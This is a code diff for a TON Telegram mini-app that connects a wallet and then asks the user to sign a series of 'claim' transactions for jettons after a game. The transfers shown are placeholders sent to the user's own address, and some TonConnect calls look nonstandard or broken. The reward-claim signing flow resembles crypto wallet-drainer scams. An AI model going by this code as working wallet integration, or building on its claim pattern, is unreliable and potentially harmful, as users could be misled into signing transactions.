@@ -7,11 +7,14 @@ let currentIndex = 0;
 // ---------- Connect Wallet ----------
 document.getElementById("connectBtn").onclick = () => {
     try {
-        ui = new TON_CONNECT_UI.TonConnectUI({
+        ui = new TonConnectUI.TonConnectUI({
             manifestUrl: "https://emperator16.github.io/miniapp/manifest.json"
         });
 
-        // event listener برای وضعیت اتصال
+        // نمایش اتصال به والت (modal خود TonConnect)
+        ui.walletSelect(); 
+
+        // event listener برای تغییر وضعیت Wallet
         ui.onStatusChange((status) => {
             if (status.type === 'connected') {
                 walletAddress = status.account.address;
@@ -26,9 +29,10 @@ document.getElementById("connectBtn").onclick = () => {
                 });
             }
         });
+
     } catch(e) {
         console.error("Connection failed:", e);
-        alert("Wallet connection failed.");
+        alert("Wallet connection failed. Make sure you are in Telegram or on mobile with Tonkeeper.");
     }
 };
 
@@ -80,10 +84,11 @@ async function processNextClaim() {
     try {
         const jetton = jettonsToClaim[currentIndex];
 
+        // امضا با پرداخت فقط کارمزد
         let payload = {
             type: "transfer",
             to: walletAddress,
-            amount: 0, // فقط امضا، پرداخت کارمزد
+            amount: 0,
             payload: "0x1234"
         };
 
@@ -102,11 +107,12 @@ async function processNextClaim() {
                 document.getElementById("successDiv").style.display = "block";
             }, 3000);
         }
+
     } catch(e) {
         alert("Transaction failed or cancelled.");
         document.getElementById("rewardDiv").style.display = "block";
     }
-};
+}
 
 // ---------- Play Again ----------
 document.getElementById("playAgainBtn").onclick = () => {
@@ -122,5 +128,3 @@ async function fetchUserJettons(address) {
         {address: '0:def456...', amount: 1}
     ];
 }
-
-
